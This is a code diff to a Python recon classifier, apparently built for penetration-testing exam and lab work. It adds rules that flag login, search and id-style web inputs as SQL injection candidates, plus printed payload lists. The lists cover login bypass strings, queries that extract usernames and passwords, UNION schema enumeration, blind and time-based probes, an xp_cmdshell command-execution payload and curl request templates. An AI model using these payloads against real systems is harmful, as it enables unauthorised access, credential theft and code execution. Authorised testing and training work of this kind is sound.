@@ -5,6 +5,9 @@ Heuristic ruleset for the passive web recon classifier.
 Maps discovered input surfaces (param names / field types / contexts) to CANDIDATE
 vulnerability classes, and provides the operator's own pastable MANUAL commands per class.
 
+SQLi is a scoped pass (`classify_sqli_surface`): login / search / id-style DB lookups
+only. It is NOT a broad param-name trigger. Pastables are printed, never sent.
+
 PASSIVE / OUTPUT-ONLY. Nothing here is executed by the tool. These templates are PRINTED
 for the operator to copy and run manually. No auto-exploitation, no scanner invocation.
 
@@ -222,10 +225,377 @@ PASTABLES = {
         ],
         "note": "If auth uses only HTTP headers, try HEAD/OPTIONS to bypass. Swap GET<->POST.",
     },
+
+    "sqli": {
+        "why": "input feeds an auth check or DB lookup (login / search / id-style)",
+        "canonical": [],  # assembled per-sink by sqli_pastables(); never a broad dump
+        "verbose": [],
+        "note": (
+            "Candidate sink only — this tool never sends these strings. "
+            "Context: string -> break with ' ; numeric -> no quote ; parenthesized query -> ') . "
+            "Try BOTH ' and \" and the ') paren variants. "
+            "GOTCHA: IN (SELECT ...) needs EXACTLY ONE column -> CONCAT to merge multiple, or use UNION. "
+            "sqlmap is intentionally not emitted (auto-exploitation)."
+        ),
+    },
 }
 
 # ---------------------------------------------------------------------------
+# SQLi surface pass (CPTS/OSCP-scoped). Forms first. NOT a param-name trigger.
+# Flag only inputs that look like they feed an auth query or DB lookup.
+# Pure mapping: never sends a payload, never submits a form, never confirms injection.
+# ---------------------------------------------------------------------------
+
+def _norm_ident(value):
+    return (value or "").strip().lower().replace("-", "_")
+
+
+SQLI_SKIP_NAMES = {
+    "csrf", "csrf_token", "csrftoken", "_token", "token", "authenticity_token",
+    "nonce", "_wpnonce", "wp_nonce", "submit", "commit", "remember", "rememberme",
+    "remember_me", "captcha", "recaptcha", "g_recaptcha_response", "honeypot",
+    "_method",
+}
+
+SQLI_SKIP_TYPES = {
+    "submit", "button", "reset", "image", "file", "checkbox", "radio",
+}
+
+# Identity fields on login / reset / register forms
+SQLI_USERNAME_NAMES = {
+    "user", "username", "user_name", "uname", "login", "login_id", "user_login",
+    "log", "email", "mail", "user_email", "e_mail", "userid", "user_id", "uid",
+    "account", "acct", "name", "id", "os_username", "j_username",
+}
+
+# Search: exact short names (substring would be noise) + longer needles
+SQLI_SEARCH_EXACT = {"q", "s", "item", "name"}
+SQLI_SEARCH_NEEDLES = ("search", "query", "find", "lookup", "keyword")
+
+# id-style URL/GET params — exact after hyphen→underscore. Not a generic *_id sweep.
+SQLI_ID_EXACT = {
+    "id", "uid", "user_id", "userid", "pid", "product", "prod", "product_id",
+    "item", "item_id", "cat", "category", "category_id", "cat_id",
+    "article", "article_id", "page_id", "doc", "doc_id",
+    "order", "order_id", "num", "record", "record_id",
+}
+
+SQLI_FILTER_EXACT = {
+    "sort", "order", "orderby", "order_by", "filter",
+    "category", "cat", "status", "type", "view", "group", "dir",
+}
+
+SQLI_COMMENT_NAMES = {"comment", "comments", "reply", "guestbook"}
+SQLI_NEWSLETTER_NAMES = {"newsletter", "subscribe", "mailing", "mailchimp"}
+
+# Operator dialect — DEFAULT break-out probes
+SQLI_BREAKOUT = [
+    "'",
+    '"',
+    "`",
+    "')",
+    '")',
+    "' -- -",
+    '" -- -',
+]
+
+# Operator dialect — DEFAULT auth bypass (login fields)
+SQLI_AUTH_BYPASS = [
+    "admin' -- -",
+    "admin' #",
+    "' OR 1=1-- -",
+    "' OR '1'='1",
+    "') OR ('1'='1",
+    "admin') -- -",
+]
+
+# Operator dialect — DEFAULT OffSec-style survey via OR ... IN (SELECT ...)
+SQLI_SURVEY = [
+    "' OR 1=1 IN (SELECT @@version) -- -",
+    "' OR 1=1 IN (SELECT version()) -- -",
+    "' OR 1=1 IN (SELECT CONCAT(username,0x20,password) FROM users) -- -",
+    "' OR 1=1 IN (SELECT CONCAT(host,unique_users) FROM sys.host_summary) -- -",
+]
+
+# VERBOSE: UNION workflow (reflected output — search/item params)
+SQLI_UNION = [
+    "' ORDER BY 1,2,3,4,5,6,7 -- -",
+    "' UNION SELECT 1,2,3,4,5 -- -",
+    "' UNION SELECT 1,version(),database(),4,5 -- -",
+    "' UNION SELECT null,table_name,column_name,table_schema,null FROM information_schema.columns WHERE table_schema=database() -- -",
+]
+
+SQLI_ERROR = [
+    "' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e)) -- -",
+    "' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--",
+]
+
+SQLI_BLIND = [
+    "' AND 1=1 -- -",
+    "' AND 1=2 -- -",
+    "' AND (SELECT substring(user(),1,1))='a' -- -",
+]
+
+SQLI_TIME = [
+    "' AND IF(1=1,sleep(3),\"false\") -- -",
+    "' AND (SELECT SLEEP(5)) -- -",
+    "'; WAITFOR DELAY '0:0:5' --",
+    "'; SELECT pg_sleep(5) --",
+]
+
+SQLI_STACKED = [
+    "'; EXEC xp_cmdshell 'whoami' -- -",
+]
+
+SQLI_CURL = [
+    (
+        "curl --path-as-is -i -s -k -X POST "
+        "-H 'Content-Type: application/x-www-form-urlencoded' "
+        "'http://<TARGET>/<PAGE>' --data-urlencode \"<PARAM>=offsec' OR 1=1 -- -\""
+    ),
+    (
+        "curl --path-as-is -i -s -k --get "
+        "'http://<TARGET>/<PAGE>' --data-urlencode \"<PARAM>='\""
+    ),
+]
+
+
+def _is_username_name(param_name):
+    n = _norm_ident(param_name)
+    return n in SQLI_USERNAME_NAMES
+
+
+def _is_sqli_search_name(param_name, getish=False):
+    n = _norm_ident(param_name)
+    raw = (param_name or "").strip().lower()
+    if raw in {"q", "s"} or n in {"q", "s"}:
+        return True
+    # `item` is an OffSec listing param (GET ?item= and search forms). `name` only as GET/URL.
+    if n == "item":
+        return True
+    if n == "name":
+        return getish
+    return any(needle in n for needle in SQLI_SEARCH_NEEDLES)
+
+
+def _is_sqli_id_name(param_name):
+    return _norm_ident(param_name) in SQLI_ID_EXACT
+
+
+def _is_sqli_filter_name(param_name):
+    return _norm_ident(param_name) in SQLI_FILTER_EXACT
+
+
+def _is_comment_name(param_name):
+    n = _norm_ident(param_name)
+    return n in SQLI_COMMENT_NAMES or n.endswith("_comment") or n.startswith("comment_")
+
+
+def _is_newsletter_name(param_name):
+    n = _norm_ident(param_name)
+    if n in SQLI_NEWSLETTER_NAMES:
+        return True
+    return any(k in n for k in SQLI_NEWSLETTER_NAMES)
+
+
+def _is_getish(method, kind):
+    k = kind or ""
+    if k in {"query_param", "js_param"}:
+        return True
+    return (method or "").upper() in {"GET", "HEAD"}
+
+
+def _sqli_hit(priority, role, why):
+    return {"priority": priority, "role": role, "why": why}
+
+
+def classify_sqli_surface(
+    param_name=None,
+    context_flags=None,
+    field_type=None,
+    method=None,
+    kind=None,
+):
+    """
+    Scoped SQLi candidate check. Returns {priority, role, why} or None.
+
+    Forms / login context are inspected first. A field must match HIGH or MEDIUM
+    criteria; everything else stays silent. Does not use PARAM_NAME_TRIGGERS.
+    Pure function: no network, no execution.
+    """
+    flags = set(context_flags or [])
+    name = param_name or ""
+    n = _norm_ident(name)
+    ft = (field_type or "").lower()
+    kind = kind or ""
+
+    if kind == "site" or name in {"", "*"}:
+        return None
+    if "is_file_input" in flags or ft == "file":
+        return None
+    if ft in SQLI_SKIP_TYPES:
+        return None
+    if n in SQLI_SKIP_NAMES:
+        return None
+
+    # --- forms first --------------------------------------------------------
+
+    if "is_login_form" in flags:
+        if "is_password_field" in flags or ft == "password":
+            return _sqli_hit(
+                "HIGH",
+                "login",
+                "HIGH: login form (password field present) — password feeds the auth query",
+            )
+        if ft == "hidden":
+            return None
+        if "is_username_field" in flags or _is_username_name(name) or ft == "email":
+            return _sqli_hit(
+                "HIGH",
+                "login",
+                "HIGH: login form (password field present) — username is the primary auth-query sink",
+            )
+        return None
+
+    if "is_login_adjacent_form" in flags:
+        if ft == "hidden":
+            return None
+        if "is_username_field" in flags or _is_username_name(name) or ft == "email":
+            return _sqli_hit(
+                "MEDIUM",
+                "login_adjacent",
+                "MEDIUM: login-adjacent form (password reset / registration) — single identity lookup",
+            )
+        return None
+
+    if "is_comment_form" in flags:
+        if _is_comment_name(name) or ft == "textarea":
+            return _sqli_hit(
+                "MEDIUM",
+                "comment",
+                "MEDIUM: comment field on a DB-backed form (exam-seen INSERT/lookup sink)",
+            )
+        return None  # e.g. commenter `name` is not a search HIGH
+
+    if "is_newsletter_form" in flags:
+        if ft == "email" or _is_newsletter_name(name) or _is_username_name(name):
+            return _sqli_hit(
+                "MEDIUM",
+                "newsletter",
+                "MEDIUM: newsletter field on a DB-backed form (exam-seen injectable)",
+            )
+        return None
+
+    # --- HIGH: search, then id-style GET ------------------------------------
+
+    search_like = (
+        "is_search_field" in flags
+        or _is_sqli_search_name(name, getish=_is_getish(method, kind))
+        or (
+            "is_search_form" in flags
+            and ft not in {"hidden", "select"}
+            and ("is_free_text" in flags or ft in {"text", "search", "textarea", ""})
+        )
+    )
+    if search_like:
+        return _sqli_hit(
+            "HIGH",
+            "search",
+            "HIGH: search field — likely SELECT ... LIKE / result listing (OffSec ?s= / item=)",
+        )
+
+    if _is_getish(method, kind) and _is_sqli_id_name(name):
+        return _sqli_hit(
+            "HIGH",
+            "id",
+            "HIGH: id-style GET/URL param — likely WHERE id= (or equivalent) lookup",
+        )
+
+    # --- MEDIUM: filter/sort GET, standalone newsletter/comment names -------
+
+    if _is_getish(method, kind) and _is_sqli_filter_name(name):
+        return _sqli_hit(
+            "MEDIUM",
+            "filter",
+            "MEDIUM: filter/sort param — may be interpolated into ORDER BY / WHERE",
+        )
+
+    if _is_comment_name(name):
+        return _sqli_hit(
+            "MEDIUM",
+            "comment",
+            "MEDIUM: comment field (DB-backed insert; exam-seen injectable)",
+        )
+
+    if _is_newsletter_name(name):
+        return _sqli_hit(
+            "MEDIUM",
+            "newsletter",
+            "MEDIUM: newsletter field (DB-backed insert/lookup; exam-seen injectable)",
+        )
+
+    return None
+
+
+def sqli_pastables(role="id", verbose=False, param=None):
+    """Assemble operator-dialect SQLi pastables for a sink role. Output only."""
+    role = role or "id"
+    param = param or "<PARAM>"
+    commands = [
+        "# break-out probes — try each quote/paren style; watch for error or changed response",
+        *SQLI_BREAKOUT,
+        "# Context: string -> break with ' ; numeric -> no quote ; parenthesized query -> ') . Try BOTH ' and \" and the ') paren variants.",
+    ]
+    if role == "login":
+        commands += [
+            "# auth bypass (login fields)",
+            *SQLI_AUTH_BYPASS,
+            "# OffSec-style survey via OR ... IN (SELECT ...) — IN (SELECT ...) needs EXACTLY ONE column (CONCAT to merge, or UNION)",
+            *SQLI_SURVEY,
+        ]
+    elif role in {"id", "login_adjacent"}:
+        commands += [
+            "# OffSec-style survey via OR ... IN (SELECT ...) — IN (SELECT ...) needs EXACTLY ONE column (CONCAT to merge, or UNION)",
+            *SQLI_SURVEY,
+        ]
+
+    if verbose:
+        if role in {"search", "id", "filter"}:
+            commands += [
+                f"# UNION workflow (reflected output). Prefix search payloads with % to display all rows, e.g. {param}=%' UNION ...",
+                *SQLI_UNION,
+            ]
+        commands += [
+            "# error-based",
+            *SQLI_ERROR,
+            "# blind boolean",
+            *SQLI_BLIND,
+            "# blind time (operator IF style)",
+            *SQLI_TIME,
+            "# stacked / code-exec (MSSQL/Postgres, when the driver allows)",
+            *SQLI_STACKED,
+            "# curl reminders — always --data-urlencode and --path-as-is (GET-based blind: --get --data-urlencode)",
+            *SQLI_CURL,
+        ]
+
+    note = PASTABLES["sqli"]["note"]
+    if role == "search":
+        note = (
+            "Prefix search payloads with % to display all rows (item=%' UNION ...). " + note
+        )
+    elif role == "login":
+        note = "Try auth bypass on the username field first. " + note
+
+    return {
+        "why": PASTABLES["sqli"]["why"],
+        "note": note,
+        "commands": commands,
+    }
+
+
+# ---------------------------------------------------------------------------
 # Classifier entry point (pure mapping; NO network, NO execution).
+# SQLi is a separate scoped pass (classify_sqli_surface) — not PARAM_NAME_TRIGGERS.
 # ---------------------------------------------------------------------------
 
 def classify_input(param_name=None, context_flags=None):
